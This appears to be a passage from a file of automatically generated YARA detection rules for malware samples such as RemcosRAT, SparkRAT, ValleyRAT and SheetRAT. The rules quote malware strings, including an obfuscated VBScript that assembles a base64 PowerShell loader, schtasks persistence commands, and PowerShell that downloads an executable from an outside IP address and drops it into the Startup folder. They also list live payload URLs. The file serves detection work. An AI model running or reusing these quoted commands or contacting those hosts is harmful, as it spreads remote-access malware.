      $s10 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "bcucuvkkoaudyrem = bcucuvkkoaudyrem & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__b8aae9a5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b8aae9a5.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8aae9a506fea0ae59c1bab1d46ad400597a741c5c009a20e13ac4e0c55fac0e"
   strings:
      $s1 = "execute(\"\" & lndntpmknjpxeiwl & \".Run \"\"powershell.exe \" & wwlituuibybuouqf & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & lndntpmknjpxeiwl & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "wwlituuibybuouqf = wwlituuibybuouqf & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s13 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s14 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
      $s15 = "wwlituuibybuouqf = wwlituuibybuouqf & \";$MgOrq = ($IuJUJJZz -replace '" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature__76e3f0ae {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_76e3f0ae.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "76e3f0ae9a0f5759b122f17de5bc70652b3f2d284a0466dc48c79aa4f55c92f7"
   strings:
      $x1 = "')[_0x496020(0x1ae)](''));function getRandomInt(_0x273882,_0x3280fc){var _0x58beaf=_0x496020;return _0x273882=Math[_0x58beaf(0x1" ascii /* score: '39.00'*/
      $x2 = "(function(_0x1271e9,_0x5f01fa){var _0x45f6aa=_0x266c,_0x242890=_0x1271e9();while(!![]){try{var _0x469a9e=parseInt(_0x45f6aa(0x10" ascii /* score: '36.00'*/
      $x3 = "')[_0x519aac(0x1c3)](''),0x0,![]);function getRandomInt(_0x1bbccc,_0x4e3f82){var _0x5a5065=_0x519aac;return _0x1bbccc=Math[_0x5a" ascii /* score: '36.00'*/
      $x4 = "','29702wReuFn','attachEvent','1105475aEYSRg','3994760qVyYxn'];_0x2331=function(){return _0x442583;};return _0x2331();}function " ascii /* score: '36.00'*/
      $x5 = "')[_0x51e4d7(0x1dc)]('');function getRandomInt(_0x4cdeb9,_0x328ad4){var _0xfaa6ba=_0x51e4d7;return _0x4cdeb9=Math[_0xfaa6ba(0x1c" ascii /* score: '36.00'*/
      $s6 = "')[_0x54d0ef(0x128)]('');function getRandomInt(_0x5de012,_0x26ac5d){var _0x2e0303=_0x54d0ef;return _0x5de012=Math[_0x2e0303(0x13" ascii /* score: '30.00'*/
      $s7 = "ll','2702676FTJnEy','11595166GwycUr','~$$*%$##??#~^!* ~?$~$&*&$^$$*! *#!$^%%$%! ~#^!**#&*%#& #^#!^$~*?*~ &&?*!?!#&&&?*!~!*^ ?^$ " ascii /* score: '30.00'*/
      $s8 = ".dll','422068RmYanE','protocol','45GRLNWI','event','href','ceil','mouseout','Run','src','1674013YgFChn','C:\\x5cWin" fullword ascii /* score: '25.00'*/
      $s9 = "A%A%A^A^A^A&g&L*A*A*8?/?/?A~8~A A E A!A!A#A#I#A$A$Q$p%V%T^','match','4936440eymMBc','text','host','//stats.wordpress.com/c.gif?s" ascii /* score: '23.00'*/
      $s10 = "_blog=_0x4b0071,_post=_0x5c1e13;if(typeof document[_0x44ed08(0x14c)]['host']!=_0x44ed08(0x119))var _0x429f37=document[_0x44ed08(" ascii /* score: '19.00'*/
      $s11 = "8996,_0x33160b){var _0x3abe3d=_0x266c;_blog=_0x2a8996,_post=_0x33160b;if(typeof document[_0x3abe3d(0x14c)]['host']!=_0x3abe3d(0x" ascii /* score: '19.00'*/
      $s12 = "x44eada(0x1a0)?_post:0x0,_0x3bbebf=new Image(0x1,0x1);_0x3bbebf[_0x44eada(0x181)]=_0xe9c4c9+'//stats.wordpress.com/c.gif?s=2&b='" ascii /* score: '19.00'*/
      $s13 = "_post!=_0x84317f(0x119)?_post:0x0,_0x580210=new Image(0x1,0x1);_0x580210[_0x84317f(0x166)]=_0x304f7a+'//stats.wordpress.com/c.gi" ascii /* score: '19.00'*/
      $s14 = "')[_0x496020(0x1ae)]('');function getRandomInt(_0x440dab,_0x390a1e){var _0x378236=_0x496020;return _0x440dab=Math[_0x378236(0x1b" ascii /* score: '19.00'*/
      $s15 = "{var _0x5333e4=_0x266c;_blog=_0x1eb8ee,_post=_0x572acf;if(typeof document[_0x5333e4(0x14c)]['host']!=_0x5333e4(0x119))var _0xb20" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 16000KB and
      1 of ($x*) and all of them
}

rule VenomRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file VenomRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee6844c262a1f73501e51fa9df9c6c993bf442c3d4b78686e3ace38b18789210"
   strings:
      $x1 = "ProcessHacker.exe" fullword wide /* score: '33.00'*/
      $x2 = "C:\\Temp\\client.log" fullword wide /* score: '32.00'*/
      $x3 = "C:\\Temp\\client_ex.log" fullword wide /* score: '32.00'*/
      $s4 = "MpCmdRun.exe" fullword wide /* score: '28.00'*/
      $s5 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s6 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s7 = "ConfigSecurityPolicy.exe" fullword wide /* score: '25.00'*/
      $s8 = "MSConfig.exe" fullword wide /* score: '25.00'*/
      $s9 = "GetUserProcessList" fullword ascii /* score: '23.00'*/
      $s10 = "C://Temp//1.log" fullword wide /* score: '23.00'*/
      $s11 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s12 = "Client.exe" fullword ascii /* score: '22.00'*/
      $s13 = "MsMpEng.exe" fullword wide /* score: '22.00'*/
      $s14 = "keyLogger" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s15 = "procexp.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__89be0060 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_89be0060.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "89be0060e88e37f5b5c3736fff092b5cd6e89eea26c6b4438e8932e7925a4837"
   strings:
      $s1 = "Qaseneyen.SmartBakingController+VB$StateMachine_37_MonitorDoughProofing, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKe" ascii /* score: '29.00'*/
      $s2 = "Qaseneyen.SmartBakingController+VB$StateMachine_28_StreamBakingPhases, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKeyT" ascii /* score: '29.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPd" fullword ascii /* score: '27.00'*/
      $s4 = "Qaseneyen.exe" fullword wide /* score: '27.00'*/
      $s5 = "Qaseneyen.SmartBakingController+VB$StateMachine_28_StreamBakingPhases, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKeyT" ascii /* score: '26.00'*/
      $s6 = "Qaseneyen.SmartBakingController+VB$StateMachine_37_MonitorDoughProofing, Htz0r7y, Version=5.16.23.255, Culture=neutral, PublicKe" ascii /* score: '23.00'*/
      $s7 = "service@marshmallowmasters.com" fullword wide /* score: '21.00'*/
      $s8 = "r32.dll" fullword ascii /* score: '20.00'*/
      $s9 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s10 = "tem.Com" fullword ascii /* score: '18.00'*/
      $s11 = "Executi" fullword ascii /* score: '18.00'*/
      $s12 = "contact@chocomakers.com" fullword wide /* score: '18.00'*/
      $s13 = "info@sweetgum.com" fullword wide /* score: '18.00'*/
      $s14 = "sales@lollyworld.com" fullword wide /* score: '18.00'*/
      $s15 = "info@sugarfreesweets.com" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule Rhadamanthys_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c627b8f1 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c627b8f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c627b8f1fd2d83709aa3f42a2fe0ea6fc6dd5ab1353f699fb71da4b7ff57f0cc"
   strings:
      $s1 = "Sprdef2.exe" fullword wide /* score: '22.00'*/
      $s2 = "An MKV file was found in the temp folder during batch processing. This may indicate a failed cleanup or overwrite risk." fullword wide /* score: '21.00'*/
      $s3 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s4 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s5 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s6 = "EXE files (*.exe)|*.exe" fullword wide /* score: '19.00'*/
      $s7 = "Stop the current operation. Interrupting the process may cause an error." fullword wide /* score: '19.00'*/
      $s8 = "DocumentModel.GetLineTokens error: {0}" fullword wide /* score: '18.00'*/
      $s9 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s10 = " Could not kill MakeMKV info process." fullword wide /* score: '17.00'*/
      $s11 = " Could not stop process." fullword wide /* score: '17.00'*/
      $s12 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s13 = ":http://crl.sectigo.com/SectigoPublicCodeSigningCAEVR36.crl0{" fullword ascii /* score: '16.00'*/
      $s14 = ":http://crt.sectigo.com/SectigoPublicCodeSigningCAEVR36.crt0#" fullword ascii /* score: '16.00'*/
      $s15 = "DocumentModel.GetAllText error: {0}" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ccfe3443a805b88337e9b3d0698993c9d0c37c09e6c5351886e59067f9e32ef7"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = "YkozMWEgWm" fullword ascii /* base64 encoded string 'bJ31a Z' */ /* score: '14.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "DigiCert Timestamp 2022 - 20" fullword ascii /* score: '12.00'*/
      $s5 = "azywMsJHFtPhEYUV" fullword ascii /* score: '9.00'*/
      $s6 = "TdLlGrDLiTLQeNWIyfOrfNU" fullword ascii /* score: '9.00'*/
      $s7 = "GmhhljUMhirCE" fullword ascii /* score: '9.00'*/
      $s8 = "LezDLlxgTeoqLdNVz" fullword ascii /* score: '9.00'*/
      $s9 = "CLGSHEllubdbTSWCTIHkcho" fullword ascii /* score: '9.00'*/
      $s10 = "QjIFPcHcqXBuziiRCmok" fullword ascii /* score: '9.00'*/
      $s11 = "BdYdUjGLogbWuWmzH" fullword ascii /* score: '9.00'*/
      $s12 = "PwdllGlPDo" fullword ascii /* score: '9.00'*/
      $s13 = "ydGtEyeoSDaNTOOdmdI" fullword ascii /* score: '9.00'*/
      $s14 = "wsopNpPkgeTfxvVYQNb" fullword ascii /* score: '9.00'*/
      $s15 = "KsGGdEuuXeYEglYesZvYBEfyd" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__59ac390e {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_59ac390e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59ac390eadca30557132791b273aa9e342623a669ba27c8ee81130df462f0074"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = "RABkNFdOeD" fullword ascii /* base64 encoded string 'D d4WNx' */ /* score: '14.00'*/
      $s3 = "tezWWdUmpncrsbhmk" fullword ascii /* score: '14.00'*/
      $s4 = "zbUdiSEEnXCt" fullword wide /* base64 encoded string 'mGbHA'\+' */ /* score: '14.00'*/
      $s5 = "qBjISObcWkeYEzuED" fullword ascii /* score: '12.00'*/
      $s6 = "AirCCKeyfBffCVNHoPsg" fullword ascii /* score: '12.00'*/
      $s7 = "#\\-pd$p:\\(|Xph:$(00h8\\Zdhsd(g$#" fullword wide /* score: '10.00'*/
      $s8 = "JL9e2w^T\"jp|dhfh/X\"2p:-h8f\\Ue\"V+dd.:XY.dfph:\"8p:0hsh:" fullword wide /* score: '10.00'*/
      $s9 = "HhxicPuVgvmhcdllFdQURleY" fullword ascii /* score: '9.00'*/
      $s10 = "wRvjEmMNZiGetfRPqcCgBvDOF" fullword ascii /* score: '9.00'*/
      $s11 = "xBAwnjFiYJGCFTPMQJRQK" fullword ascii /* score: '9.00'*/
      $s12 = "jLoGgauOmHdHlIdjnCEUJvknw" fullword ascii /* score: '9.00'*/
      $s13 = "vCKyPwOPDlLOskjIlcUOPAXD" fullword ascii /* score: '9.00'*/
      $s14 = "rcslsQILoGoVzvdiNlhoyD" fullword ascii /* score: '9.00'*/
      $s15 = "leYEVlbIzKHHagZHam" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__24fa7336 {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24fa7336.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24fa73362c2f601aa3016bc38e5d0ca8f5f4d25c37c0ffdc08dc0a022c5e9510"
   strings:
      $s1 = "Microsoft Publisher Host.exe" fullword wide /* score: '24.00'*/
      $s2 = "Xeno-3.14.exe" fullword ascii /* score: '19.00'*/
      $s3 = "MiRUNiRSH" fullword ascii /* base64 encoded string '2$T6$R' */ /* score: '17.00'*/
      $s4 = "<StartAsBypass>b__10_0" fullword ascii /* score: '15.00'*/
      $s5 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
      $s6 = "KDEgPClHIK" fullword ascii /* base64 encoded string '(1 <)G ' */ /* score: '14.00'*/
      $s7 = "qYlZnOklw" fullword ascii /* base64 encoded string 'bVg:Ip' */ /* score: '14.00'*/
      $s8 = "ZGtLNiwzt" fullword ascii /* base64 encoded string 'dkK6,3' */ /* score: '14.00'*/
      $s9 = "vSnNGcmUqQFE" fullword ascii /* base64 encoded string 'JsFre*@Q' */ /* score: '14.00'*/
      $s10 = "YjWauwyDeUlogX" fullword ascii /* score: '9.00'*/
      $s11 = "kmNMftpTzAtsX" fullword ascii /* score: '9.00'*/
      $s12 = "EYEwiDTMKhEM" fullword ascii /* score: '9.00'*/
      $s13 = "ZSrRYEqBqCFTp" fullword ascii /* score: '9.00'*/
      $s14 = "gcELOGSVyCvug" fullword ascii /* score: '9.00'*/
      $s15 = "jloGtPZKkPoMCe" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SparkRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file SparkRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "17e2f6e0f9793935ae39d6beca31f54379023f39bab8daa717660b46b5eb577f"
   strings:
      $x1 = "$u=\"http://87.106.52.7:6472/sparkworkings.exe\";$p=\"$env:APPDATA\\ClientApp\\sparkworkings.exe\";$startup=\"$env:APPDATA\\Micr" ascii /* score: '45.00'*/
      $s2 = "$u=\"http://87.106.52.7:6472/sparkworkings.exe\";$p=\"$env:APPDATA\\ClientApp\\sparkworkings.exe\";$startup=\"$env:APPDATA\\Micr" ascii /* score: '26.00'*/
      $s3 = "lit-Path $p) | Out-Null};Invoke-WebRequest $u -OutFile $p *> $null;Copy-Item $p -Destination $startup -Force;Start-Process $p -W" ascii /* score: '19.00'*/
      $s4 = "ndows\\Start Menu\\Programs\\Startup\\sparkworkings.exe\";if(-not (Test-Path (Split-Path $p))){New-Item -ItemType Directory -Pat" ascii /* score: '15.00'*/
      $s5 = "get_ControlKeyState" fullword ascii /* score: '12.00'*/
      $s6 = "get_PrivateData" fullword ascii /* score: '12.00'*/
      $s7 = "GetCharFromKeys" fullword ascii /* score: '12.00'*/
      $s8 = "get_ErrorBackgroundColor" fullword ascii /* score: '12.00'*/
      $s9 = "get_ErrorForegroundColor" fullword ascii /* score: '12.00'*/
      $s10 = "PSRunspace-Host" fullword wide /* score: '12.00'*/
      $s11 = "keyinfo" fullword ascii /* score: '11.00'*/
      $s12 = "ReadKey_Box" fullword ascii /* score: '10.00'*/
      $s13 = "get_ShouldExit" fullword ascii /* score: '9.00'*/
      $s14 = "get_ProgressBackgroundColor" fullword ascii /* score: '9.00'*/
      $s15 = "get_VerboseBackgroundColor" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5078c343 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5078c343.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5078c343420073ff89ed24cf79285abacfe4701acd4e33ccdefebb923441d352"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADp" fullword ascii /* score: '27.00'*/
      $s2 = "XKng.exe" fullword wide /* score: '22.00'*/
      $s3 = "XKng.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "products.txt" fullword wide /* score: '14.00'*/
      $s5 = "listings.txt" fullword wide /* score: '14.00'*/
      $s6 = "results.txt" fullword wide /* score: '14.00'*/
      $s7 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s8 = ".NET Framework 4.5*" fullword ascii /* score: '10.00'*/
      $s9 = "get_DateAnnounced" fullword ascii /* score: '9.00'*/
      $s10 = "get_Tokens" fullword ascii /* score: '9.00'*/
      $s11 = "get_Currency" fullword ascii /* score: '9.00'*/
      $s12 = "get_Listings" fullword ascii /* score: '9.00'*/
      $s13 = "scoretext" fullword wide /* score: '8.00'*/
      $s14 = "racketa" fullword wide /* score: '8.00'*/
      $s15 = "listings" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4a9f2f65 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a9f2f65.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a9f2f65791e8bd5f4ba4cac2484577ae8eeb093fd143c1a9e9db88de7b09d7f"
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s2 = "en des Programms Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s3 = "ber das Programm Kurbelschwinge.exe" fullword wide /* score: '19.00'*/
      $s4 = "KatronCarecenter.exe" fullword wide /* score: '18.00'*/
      $s5 = "C:\\Ablage\\Kurbelschwinge.svg" fullword wide /* score: '16.00'*/
      $s6 = "Select * from vms_datakey where ticketkey=@tik and tahunkey=@th" fullword wide /* score: '14.00'*/
      $s7 = " group by material, batch_prod,tiket1,tiket2,tiket3,tiket4,tiket5, idinput1,idinput2,idinput3,idinput4,idinput5,take1,take2,take" wide /* score: '13.00'*/
      $s8 = "Bitte X- und Y-Koordinate des Drehpunktes der Kurbel, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s9 = "Bitte X- und Y-Koordinate des Drehpunktes der Schwinge, durch Leerzeichen getrennt, eingeben." fullword wide /* score: '13.00'*/
      $s10 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s11 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s12 = "Getriebe" fullword wide /* score: '11.00'*/
      $s13 = "Verzeichnis der Kurbelschwinge.exe: " fullword wide /* score: '11.00'*/
      $s14 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s15 = "cmdImport" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule ValleyRAT_signature__77e26aa2a5e22bfb9270f8b0ceebb1bb_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_77e26aa2a5e22bfb9270f8b0ceebb1bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd18a62c3dd7f48ddabf288d271cad000e51d629c17f1e5f70127b3dc117ed30"
   strings:
      $x1 = "pbp93q6TU3ThXREqNjwZZMzkHp2MrucQCutPuKt4kXuondWXGgI3Z7PW9exjJGNVncppmJ+0MpPOKh5UySgj5Boh2dV2+8qRkLLnwLkhFObHCTjfNqjbc7yqkFnDSfMq" ascii /* score: '48.00'*/
      $s2 = "C:\\ProgramData\\SystemLauncher\\54\\TelegramService.exe" fullword wide /* score: '27.00'*/
      $s3 = "[+] Shellcode executed successfully" fullword ascii /* score: '25.00'*/
      $s4 = "TelegramService.exe" fullword wide /* score: '25.00'*/
      $s5 = "vboxservice.exe" fullword wide /* score: '25.00'*/
      $s6 = "amsi.dll" fullword ascii /* score: '23.00'*/
      $s7 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s8 = "vmsrvc.exe" fullword wide /* score: '22.00'*/
      $s9 = "vmusrvc.exe" fullword wide /* score: '22.00'*/
      $s10 = "vboxtray.exe" fullword wide /* score: '22.00'*/
      $s11 = "vmwaretray.exe" fullword wide /* score: '22.00'*/
      $s12 = "Decrypted shellcode is empty" fullword ascii /* score: '21.00'*/
      $s13 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s14 = "Decoded data too small" fullword ascii /* score: '18.00'*/
      $s15 = " msftconnecttest.com" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7e67ca62a4743801afd4328a7ff558c84d76a09844b823ed1bb2de3de82d59ab"
   strings:
      $s1 = "http://43.225.47.216:5513/tpsvcBase.dll" fullword wide /* score: '28.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "http://43.225.47.216:5513/TPSvc.exe" fullword wide /* score: '27.00'*/
      $s4 = "tpsvcBase.dll" fullword wide /* score: '23.00'*/
      $s5 = "_ZjyYHX_Hp.exe" fullword wide /* score: '19.00'*/
      $s6 = "http://43.225.47.216:5513/123.ini" fullword wide /* score: '15.00'*/
      $s7 = "customXml/itemProps1.xmle" fullword ascii /* score: '11.00'*/
      $s8 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s9 = "customXml/itemProps1.xmlPK" fullword ascii /* score: '11.00'*/
      $s10 = "[System] Delay completed. Actual waited: " fullword ascii /* score: '10.00'*/
      $s11 = "C:\\Windows\\SysWOW64\\yyk\\" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1f9da49f {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1f9da49f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f9da49f62360d200940ac5abe3936e48f46ec727873c4f13e41fe1a583381a7"
   strings:
      $s1 = "Imfjg.exe" fullword wide /* score: '22.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteDividedTask" fullword ascii /* score: '18.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Net.IPNetwork>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s5 = "RedirectPassiveEncryptor" fullword ascii /* score: '17.00'*/
      $s6 = "https://www.arcon.com.pe/Rypbxem.dat" fullword wide /* score: '17.00'*/
      $s7 = "InstantiateExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "_CreatorExecutorTag" fullword ascii /* score: '16.00'*/
      $s9 = "decryptor" fullword wide /* score: '15.00'*/
      $s10 = "AssembleEncryptor" fullword ascii /* score: '14.00'*/
      $s11 = "GenerateNextInternalLogger" fullword ascii /* score: '14.00'*/
      $s12 = "ChangeLogger" fullword ascii /* score: '14.00'*/
      $s13 = "CreateModularEncryptor" fullword ascii /* score: '14.00'*/
      $s14 = "WatchLiteralLogger" fullword ascii /* score: '14.00'*/
      $s15 = "passiveTransmitterContent" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule RemcosRAT_signature__b5a014d7eeb4c2042897567e1288a095_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b5a014d7eeb4c2042897567e1288a095(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "140ecf21d10354385de279ce0b5104078f251c096583d156f8627c623502a4ca"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.4.0.1794\" name=\"7-Z" ascii /* score: '45.00'*/
